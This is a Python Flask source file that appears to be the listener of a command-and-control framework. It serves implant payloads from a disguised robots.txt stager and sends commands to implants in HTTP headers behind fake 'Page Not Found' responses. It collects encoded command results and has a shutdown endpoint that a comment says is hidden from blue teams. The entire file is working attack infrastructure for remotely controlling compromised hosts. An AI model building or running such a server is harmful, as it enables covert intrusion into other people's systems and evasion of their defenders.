from flask import Flask, make_response, request
import base64
from uuid import uuid4

from Implant.Implant import ImplantSingleton
from Data.Database import Database

Imp = ImplantSingleton.instance
db = Database()

app = Flask(str(uuid4()))
app.config['SECRET_KEY'] = str(uuid4())


@app.before_request
def before_request():
    # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
    return


@app.after_request
def add_header(r):
    # r.headers["X-Command"] = a
    return r


# -- TODO: extracted and added into a new stager specific listener(?)
@app.route("/robots.txt", methods=['GET'])
def Stager():
    # This endpoint is responsible for generating the implant based on stager callbacks
    implant_data = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
    if implant_data:
        output_from_parsed_template = Imp.GeneratePayload(implant_data)
        return output_from_parsed_template
    else:
        return "404", 404


@app.route("/index", methods=['GET', 'POST'])
def ImplantCheckIn():
    # Should check ANY connection in against all configured implant options (IE body, header etc)
    #   unlike they 'headers' options which is configured in the current iteration.
    if 'X-Implant' in request.headers:
        cmd_to_execute = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
        response = make_response("Page Not Found.")
        # if cmd_to_execute !="==":
        #     print("ImplantCheckIn: ",cmd_to_execute)
        response.headers["X-Command"] = cmd_to_execute
    else:
        response = make_response("Page Not Found")
        response.headers["X-Command"] = "=="
    return response


@app.route("/help", methods=['GET', 'POST'])
def ImplantCommandResult():
    # -- X-Result is a placeholder header and should be changed to a more realistic value
    if "X-Result" in request.headers:
        decoded_response = base64.b64decode(request.headers["X-Result"]).decode('utf-16').split("::", 1)
        Imp.CommandResponse(decoded_response[0], decoded_response[1], app.config['listener_type'])
    return "Page Not Found"


# This should be randomised to avoid blueteams fingerprinting the server by querying this endpoint.
@app.route("/nlaksnfaobcaowb", methods=['GET', 'POST'])
def ShutdownListener():
    if request.remote_addr == "127.0.0.1":
        print ("blah")
        shutdown_hook = request.environ.get('werkzeug.server.shutdown')
        if shutdown_hook is not None:
            shutdown_hook()
        # raise RuntimeError("Server going down")

def shutdown():
    raise RuntimeError("Server going down")